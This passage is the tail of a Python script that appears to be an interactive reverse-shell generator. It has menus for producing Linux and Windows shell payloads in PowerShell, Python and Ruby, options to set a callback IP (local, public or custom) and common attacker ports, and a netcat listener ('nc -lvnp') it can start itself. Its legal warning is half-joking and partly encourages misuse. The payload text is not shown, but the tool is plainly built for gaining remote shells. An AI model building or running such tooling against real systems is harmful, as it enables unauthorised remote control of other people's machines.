                        print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                    elif nc_choice == '2':
                        self.display_payloads(nc_payloads)
                        print(f"\n{Colors.CYAN}[*] Listener Command: {Colors.YELLOW}nc -lvnp {self.port}{Colors.ENDC}")
                        confirm = input(f"\n{Colors.YELLOW}Start listener now? (y/n):{Colors.ENDC} ").strip().lower()
                        if confirm == 'y':
                            self.start_listener()
                        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
                    elif nc_choice == '3':
                        break
                    else:
                        print(f"{Colors.RED}[!] Invalid option{Colors.ENDC}")
                        input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
            
            # Quick access options for Windows
            elif choice.lower() == 'p' and os_type == 'windows':
                self.language_submenu(os_type, 'powershell')
                
            elif choice.lower() == 'y' and os_type == 'windows':
                self.language_submenu(os_type, 'python')
                
            elif choice.lower() == 'r' and os_type == 'windows':
                self.language_submenu(os_type, 'ruby')
                
            elif choice == '5':
                break
            else:
                print(f"{Colors.RED}[!] Invalid option{Colors.ENDC}")
                input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")

def main():
    generator = RevShellGenerator()
    
    # Initial legal warning
    generator.clear_screen()
    generator.display_banner()
    print(f"\n{Colors.RED}{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
    print(f"{Colors.RED}{Colors.BOLD}║{Colors.ENDC}{Colors.YELLOW}  ⚠️  LEGAL WARNING ⚠️{' '*60}{Colors.ENDC}{Colors.RED}{Colors.BOLD}║{Colors.ENDC}")
    print(f"{Colors.RED}{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")
    print(f"{Colors.YELLOW}This tool generates REAL reverse shell payloads. So use it responsibly. Don't try to be a badass. It's cool to have fun but you need to know the law.{Colors.ENDC}")
    print(f"{Colors.YELLOW}Only use on systems you OWN or have AUTHORIZATION to test. Or you can enjoy being a badass.{Colors.ENDC}")
    print(f"{Colors.RED}{Colors.BOLD}Unauthorized access to computer systems is cool but ILLEGAL. Don't be a meanie and do it on other people's systems without their permission or you will be in a lot of trouble with the law.{Colors.ENDC}")
    print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
    
    confirm = input(f"\n{Colors.CYAN}I understand and will use this tool responsibly (yes/no):{Colors.ENDC} ").strip().lower()
    if confirm != 'yes':
        print(f"\n{Colors.YELLOW}[*] Exiting. Use responsibly!{Colors.ENDC}")
        sys.exit(0)
    
    # Initial configuration
    generator.initial_setup()
    
    while True:
        generator.clear_screen()
        generator.display_banner()
        generator.display_config()
        
        print(f"\n{Colors.BOLD}╔{'═'*78}╗{Colors.ENDC}")
        print(f"{Colors.BOLD}║{Colors.ENDC}{Colors.CYAN}  MAIN MENU{' '*68}{Colors.ENDC}{Colors.BOLD}║{Colors.ENDC}")
        print(f"{Colors.BOLD}╚{'═'*78}╝{Colors.ENDC}")
        print(f"  {Colors.GREEN}[1]{Colors.ENDC} Generate Linux Shells")
        print(f"  {Colors.GREEN}[2]{Colors.ENDC} Generate Windows Shells")
        print(f"  {Colors.GREEN}[3]{Colors.ENDC} Reconfigure IP Address")
        print(f"  {Colors.GREEN}[4]{Colors.ENDC} Reconfigure Port")
        print(f"  {Colors.GREEN}[5]{Colors.ENDC} Start Listener")
        print(f"  {Colors.GREEN}[6]{Colors.ENDC} Exit")
        print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
        
        choice = input(f"\n{Colors.CYAN}Select option:{Colors.ENDC} ").strip()
        
        if choice == '1':
            generator.submenu('linux')
        elif choice == '2':
            generator.submenu('windows')
        elif choice == '3':
            print(f"\n{Colors.CYAN}{Colors.BOLD}[*] RECONFIGURE IP ADDRESS{Colors.ENDC}")
            print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
            print(f"  {Colors.GREEN}[1]{Colors.ENDC} Use Local IP:  {Colors.YELLOW}{generator.local_ip}{Colors.ENDC}")
            print(f"  {Colors.GREEN}[2]{Colors.ENDC} Use Public IP: {Colors.YELLOW}{generator.public_ip}{Colors.ENDC}")
            print(f"  {Colors.GREEN}[3]{Colors.ENDC} Enter Custom IP")
            print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
            
            ip_choice = input(f"\n{Colors.CYAN}Select IP option:{Colors.ENDC} ").strip()
            if ip_choice == '1':
                generator.ip = generator.local_ip
                generator.ip_type = "Local"
                print(f"{Colors.GREEN}[+] IP set to Local: {generator.ip}{Colors.ENDC}")
            elif ip_choice == '2':
                generator.ip = generator.public_ip
                generator.ip_type = "Public"
                print(f"{Colors.GREEN}[+] IP set to Public: {generator.ip}{Colors.ENDC}")
            elif ip_choice == '3':
                new_ip = input(f"{Colors.CYAN}Enter IP address:{Colors.ENDC} ").strip()
                if generator.validate_ip(new_ip):
                    generator.ip = new_ip
                    generator.ip_type = "Custom"
                    print(f"{Colors.GREEN}[+] IP set to: {generator.ip}{Colors.ENDC}")
                else:
                    print(f"{Colors.RED}[!] Invalid IP address format{Colors.ENDC}")
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
            
        elif choice == '4':
            print(f"\n{Colors.CYAN}{Colors.BOLD}[*] RECONFIGURE PORT{Colors.ENDC}")
            print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
            print(f"  {Colors.GREEN}[1]{Colors.ENDC} Use port 4444")
            print(f"  {Colors.GREEN}[2]{Colors.ENDC} Use port 1337")
            print(f"  {Colors.GREEN}[3]{Colors.ENDC} Use port 9001")
            print(f"  {Colors.GREEN}[4]{Colors.ENDC} Enter custom port")
            print(f"{Colors.BOLD}{'─'*80}{Colors.ENDC}")
            
            port_choice = input(f"\n{Colors.CYAN}Select port option:{Colors.ENDC} ").strip()
            if port_choice == '1':
                generator.port = 4444
                print(f"{Colors.GREEN}[+] Port set to: {generator.port}{Colors.ENDC}")
            elif port_choice == '2':
                generator.port = 1337
                print(f"{Colors.GREEN}[+] Port set to: {generator.port}{Colors.ENDC}")
            elif port_choice == '3':
                generator.port = 9001
                print(f"{Colors.GREEN}[+] Port set to: {generator.port}{Colors.ENDC}")
            elif port_choice == '4':
                new_port = input(f"{Colors.CYAN}Enter port (1-65535):{Colors.ENDC} ").strip()
                if new_port.isdigit():
                    port_num = int(new_port)
                    if generator.validate_port(port_num):
                        generator.port = port_num
                        print(f"{Colors.GREEN}[+] Port set to: {generator.port}{Colors.ENDC}")
                    else:
                        print(f"{Colors.RED}[!] Port must be between 1 and 65535{Colors.ENDC}")
                else:
                    print(f"{Colors.RED}[!] Invalid port number{Colors.ENDC}")
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
            
        elif choice == '5':
            generator.start_listener()
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")
        elif choice == '6':
            print(f"\n{Colors.GREEN}[*] Exiting... Stay safe and legal!{Colors.ENDC}")
            sys.exit(0)
        else:
            print(f"{Colors.RED}[!] Invalid option{Colors.ENDC}")
            input(f"\n{Colors.CYAN}Press Enter to continue...{Colors.ENDC}")

if __name__ == '__main__':
    try:
        main()
    except KeyboardInterrupt:
        print(f"\n\n{Colors.YELLOW}[*] Interrupted. Exiting...{Colors.ENDC}")
        print(f"{Colors.RED}{Colors.BOLD}cya later alligator.{Colors.ENDC}")
        print(f"{Colors.RED}{Colors.BOLD}bad joke, mb chat{Colors.ENDC}")
        print(f"{Colors.RED}{Colors.BOLD}bye bye.{Colors.ENDC}")
        sys.exit(0)
